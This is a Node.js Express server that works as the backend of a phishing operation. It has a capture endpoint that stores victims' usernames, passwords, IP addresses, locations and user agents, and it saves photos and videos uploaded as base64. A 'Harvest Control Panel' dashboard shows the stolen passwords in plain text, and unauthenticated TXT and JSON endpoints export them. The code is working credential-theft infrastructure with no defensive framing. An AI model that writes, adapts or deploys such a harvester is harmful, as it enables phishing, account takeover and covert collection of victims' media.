const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); // Increased for media
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static('public'));

let creds = [];
let credCount = 0;

// Storage paths
const credsDir = process.env.TMPDIR || '/tmp/creds' || './creds';
const credsFile = path.join(credsDir, 'creds.json');
const txtFile = path.join(credsDir, 'creds.txt');
const mediaDir = path.join(credsDir, 'media'); // New media folder

function initStorage() {
    try {
        if (!fs.existsSync(credsDir)) {
            fs.mkdirSync(credsDir, { recursive: true });
        }
        if (!fs.existsSync(mediaDir)) {
            fs.mkdirSync(mediaDir, { recursive: true });
        }
        
        if (fs.existsSync(credsFile)) {
            try {
                const data = JSON.parse(fs.readFileSync(credsFile, 'utf8'));
                creds = data.creds || [];
                credCount = creds.length;
                console.log(`✅ Loaded ${creds.length} credentials`);
            } catch (e) {
                console.log('Corrupt creds.json - starting fresh');
            }
        }
    } catch (e) {
        console.log('Storage init failed:', e.message);
    }
}

initStorage();

// 🎣 CAPTURE ENDPOINT - ENHANCED FOR MEDIA
app.post('/api/capture', (req, res) => {
    try {
        console.log('🎣 POST /api/capture - platform:', req.body.platform);
        
        const payload = req.body;
        const entry = {
            id: ++credCount,
            platform: payload.platform || 'Unknown',
            username: payload.username || payload.email || payload.phone || 'unknown',
            password: payload.password || '',
            ip: payload.ip || req.ip || req.connection.remoteAddress || 'unknown',
            city: payload.city || 'unknown',
            country: payload.country || 'unknown',
            userAgent: payload.userAgent || req.get('User-Agent') || '',
            timestamp: new Date().toISOString(),
            ...payload // Store ALL fields (media_type, size, etc.)
        };
        
        // 🎥 SAVE MEDIA FILES if present
        if (payload.media_type && payload.media_data) {
            const mediaPath = path.join(mediaDir, `${entry.id}_${payload.media_filename}`);
            const base64Data = payload.media_data.replace(/^data:[\w\/]+;base64,/, '');
            fs.writeFileSync(mediaPath, base64Data, 'base64');
            entry.media_file = `/media/${path.basename(mediaPath)}`; // Serve URL
            console.log(`🎥 Saved ${payload.media_type}: ${mediaPath}`);
        }
        
        creds.unshift(entry);
        if (creds.length > 1000) creds = creds.slice(0, 1000);
        
        fs.writeFileSync(credsFile, JSON.stringify({ creds }, null, 2));
        fs.appendFileSync(txtFile, JSON.stringify(entry) + '\n');
        
        console.log(`🎣 SAVED #${entry.id}: ${entry.username}`);
        res.json({ success: true });
    } catch (e) {
        console.error('❌ Capture error:', e.message);
        res.status(500).json({ error: 'Failed to save' });
    }
});

// 📱 SERVE MEDIA FILES
app.use('/media', express.static(mediaDir));

// 📊 ENHANCED DASHBOARD WITH VIDEO PLAYER
app.get('/dashboard', (req, res) => {
    const recent = creds.slice(0, 50);
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>🎯 Harvest Dashboard</title>
    <meta name="viewport" content="width=device-width">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0d1117;color:#c9d1d9;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",monospace;padding:2rem;max-width:1400px;margin:auto;line-height:1.5}
        .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:2rem;flex-wrap:wrap;gap:1rem}
        h1{font-size:2rem;background:linear-gradient(135deg,#58a6ff,#1f6feb);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .stats{background:#21262d;padding:1.5rem;border-radius:12px;margin-bottom:2rem;text-align:center}
        .download{padding:10px 20px;background:#238636;color:white;border-radius:8px;text-decoration:none;font-weight:600;margin:0 5px}
        .table-container{overflow-x:auto;background:#161b22;border-radius:12px}
        table{width:100%;border-collapse:collapse;font-size:14px}
        th{padding:15px 20px;background:#30363d;font-weight:600;border-bottom:2px solid #484f58}
        td{padding:15px 20px;border-bottom:1px solid #30363d;word-break:break-all}
        tr:hover{background:#21262d}
        .email{font-weight:600;color:#58a6ff}
        .ip a{color:#8b949e;text-decoration:none}
        .ip a:hover{color:#58a6ff}
        .media-badge{background:#1f6feb;color:white;padding:4px 8px;border-radius:20px;font-size:12px}
        .video-player{width:100%;max-width:400px;height:225px;border-radius:8px;margin:10px 0}
        .empty{padding:6rem;text-align:center;color:#8b949e;font-size:1.2rem}
        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:1000;justify-content:center;align-items:center}
        .modal video{width:90%;max-width:800px;max-height:90%;border-radius:12px}
        .close{position:absolute;top:20px;right:30px;color:white;font-size:40px;cursor:pointer}
        @media(max-width:768px){body{padding:1rem}h1{font-size:1.5rem}}
    </style>
</head>
<body>
    <div class="header">
        <h1>🎣 Harvest Control Panel</h1>
        <div>
            <a href="/creds.txt" class="download" download>TXT Export</a>
            <a href="/creds.json" class="download" download>JSON Export</a>
        </div>
    </div>
    
    <div class="stats">
        <strong>Total Captures: ${creds.length}</strong><br>
        <small>Latest: ${creds[0] ? new Date(creds[0].timestamp).toLocaleString() : 'Waiting...'}</small>
    </div>
    
    ${creds.length ? `
    <div class="table-container">
    <table>
        <thead><tr>
            <th>ID</th><th>Time</th><th>Platform</th><th>Phone/Email</th><th>Name</th><th>IP</th><th>Media</th>
        </tr></thead>
        <tbody>
        ${recent.map(c => `
        <tr>
            <td><strong>${c.id}</strong></td>
            <td>${new Date(c.timestamp).toLocaleString()}</td>
            <td>${c.platform}</td>
            <td class="email">${c.username}</td>
            <td>${c.password}</td>
            <td><a class="ip" href="https://ipinfo.io/${c.ip}" target="_blank">${c.ip}</a></td>
            <td>
                ${c.media_type === 'photo' ? `<span class="media-badge">📸 Photo</span>` : ''}
                ${c.media_type === 'video' ? `<span class="media-badge">🎥 Video</span>` : ''}
                ${c.media_file ? `<a href="${c.media_file}" target="_blank">🔗</a>` : ''}
            </td>
        </tr>`).join('')}
        </tbody>
    </table>
    </div>
    
    <!-- 🎥 VIDEO MODAL PLAYER -->
    <div class="modal" id="videoModal">
        <span class="close" onclick="closeModal()">&times;</span>
        <video id="modalVideo" controls autoplay></video>
    </div>
    ` : '<div class="empty">🎣 No captures yet - test the phishing page!</div>'}
    
    <script>
        function openVideo(url) {
            const modal = document.getElementById('videoModal');
            const video = document.getElementById('modalVideo');
            video.src = url;
            modal.style.display = 'flex';
        }
        function closeModal() {
            document.getElementById('videoModal').style.display = 'none';
            document.getElementById('modalVideo').pause();
        }
    </script>
    
    <div style="margin-top:3rem;padding:2rem;background:#21262d;border-radius:12px;text-align:center;color:#8b949e">
        <p>✅ Videos playable! 📱 Photos viewable! 🎥 Click media links!</p>
    </div>
</body>
</html>`);
});

// Downloads
app.get('/creds.txt', (req, res) => {
    if (fs.existsSync(txtFile)) {
        res.set('Content-Type', 'text/plain');
        res.download(txtFile);
    } else {
        res.status(404).send('No credentials captured yet');
    }
});

app.get('/creds.json', (req, res) => {
    res.json({ creds, count: creds.length });
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        captures: creds.length,
        media_dir: fs.existsSync(mediaDir),
        timestamp: new Date().toISOString()
    });
});

app.listen(PORT, () => {
    console.log('🕸️ === HARVEST SERVER LIVE ===');
    console.log(`📊 Dashboard: http://localhost:${PORT}/dashboard`);
    console.log(`🔌 API: http://localhost:${PORT}/api/capture`);
    console.log(`🎥 Media: http://localhost:${PORT}/media/`);
    console.log(`✅ Videos now PLAYABLE!`);
});
